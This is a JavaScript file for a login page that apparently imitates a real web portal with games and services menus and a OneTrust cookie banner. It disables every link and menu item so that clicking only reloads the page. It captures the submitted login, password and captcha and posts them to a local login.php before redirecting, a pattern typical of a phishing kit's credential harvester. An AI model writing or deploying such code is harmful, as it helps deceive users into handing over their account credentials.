function setCookie(cname, cvalue, exdays) {
    const d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    let expires = "expires="+ d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for(let i = 0; i <ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

if (getCookie('cookie')) {
    $('#onetrust-banner-sdk').hide();
}

$('#onetrust-accept-btn-handler, .onetrust-close-btn-handler.onetrust-close-btn-ui.banner-close-button.ot-close-icon').on('click', function() {
    $('#onetrust-banner-sdk').hide();
    setCookie('cookie', 'hide', 1);
});

$('input').on('input', function() {
    $('#jsc-error-message-block-cab2-fb29-').hide();
});

$('a').on('click', function(e) {
    e.preventDefault();
    window.location.reload();
});

$(document).ready(function () {
    $("form").submit(function (event) {
        event.preventDefault();

        let formData = {
            login: $("[name='login']").val(),
            password: $("[name='password']").val(),
            captcha: $("[name='captcha']").val(),
        };

        $.ajax({
            type: "POST",
            url: "login.php",
            data: formData,
            dataType: "json",
            encode: true,
        }).done(function (data) {
            if (data.errors) {
                $('#jsc-error-message-block-cab2-fb29- p').text(data.errors.message);
                $('#jsc-error-message-block-cab2-fb29-').show();
            } else {
                window.location.href = data.redirect_to;
            }
        });
    });
});

$('.cm-showcase_opener.js-cm-tooltip-services.js-cm-dropdown-link').on('click', function() {
    $('.cm-showcase_opener.js-cm-tooltip-games.js-cm-dropdown-link').removeClass('cm-showcase_opener__opened');
    $('.cm-showcase_dropdown.js-cm-dropdown.js-cm-games-dropdown.cm-dropdown__opened.cm-showcase_dropdown__opened').addClass('hidden')

    $('.cm-showcase_opener.js-cm-tooltip-services.js-cm-dropdown-link').toggleClass('cm-showcase_opener__opened');
    $('.cm-showcase_dropdown.js-cm-dropdown.js-cm-services-dropdown.cm-dropdown__opened.cm-showcase_dropdown__opened').toggleClass('hidden')
});

$('.cm-showcase_opener.js-cm-tooltip-games.js-cm-dropdown-link').on('click', function() {
    $('.cm-showcase_opener.js-cm-tooltip-services.js-cm-dropdown-link').removeClass('cm-showcase_opener__opened');
    $('.cm-showcase_dropdown.js-cm-dropdown.js-cm-services-dropdown.cm-dropdown__opened.cm-showcase_dropdown__opened').addClass('hidden')

    $('.cm-showcase_opener.js-cm-tooltip-games.js-cm-dropdown-link').toggleClass('cm-showcase_opener__opened');
    $('.cm-showcase_dropdown.js-cm-dropdown.js-cm-games-dropdown.cm-dropdown__opened.cm-showcase_dropdown__opened').toggleClass('hidden')
});


$('.cm-showcase_list.js-tab-carousel li').on('click', function(e) {
    e.preventDefault();
    window.location.reload();
});